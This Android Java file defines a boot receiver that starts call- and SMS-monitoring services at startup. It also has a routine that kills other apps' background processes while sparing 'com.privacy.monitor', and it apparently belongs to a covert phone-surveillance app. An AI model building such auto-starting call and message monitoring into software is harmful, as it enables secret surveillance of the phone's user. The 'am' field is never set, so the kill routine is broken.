package com.privacy.system.receiver;

import java.util.List;
import com.privacy.system.domain.TaskInfo;
import com.privacy.system.provider.TaskInfoProvider;
import com.privacy.system.service.CallMonitoringService;
import com.privacy.system.service.SMSMonitoringService;
import com.privacy.system.util.Logger;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
/**
 * 拦截开机广播
 */
public class BootReceiver extends BroadcastReceiver {

	private ActivityManager am;
	
	@Override
	public void onReceive(Context context, Intent intent) {
		Logger.d("BootRectiver", "开机广播");
		
		Intent intent2 = new Intent(context, CallMonitoringService.class);
		context.startService(intent2);

		Intent intent3 = new Intent(context, SMSMonitoringService.class);
		context.startService(intent3);
		
	}

	/**
	 * 杀死所有正在运行的进程(除系统进程外)
	 */
	public void killTask(Context context) {

		TaskInfoProvider provider = new TaskInfoProvider(context);
		List<TaskInfo> taskInfos = provider.getAllTasks(getProcessAppInfo(context));
		for (TaskInfo taskInfo : taskInfos) {
			String packname = taskInfo.getPackname();
			Logger.d("BootRectiver", "杀死了..." + packname);
			if (!"com.privacy.monitor".equals(packname)) {
				am.killBackgroundProcesses(taskInfo.getPackname());
			}
		}
	}

	private List<RunningAppProcessInfo> getProcessAppInfo(Context context) {

		return am.getRunningAppProcesses();

	}

}
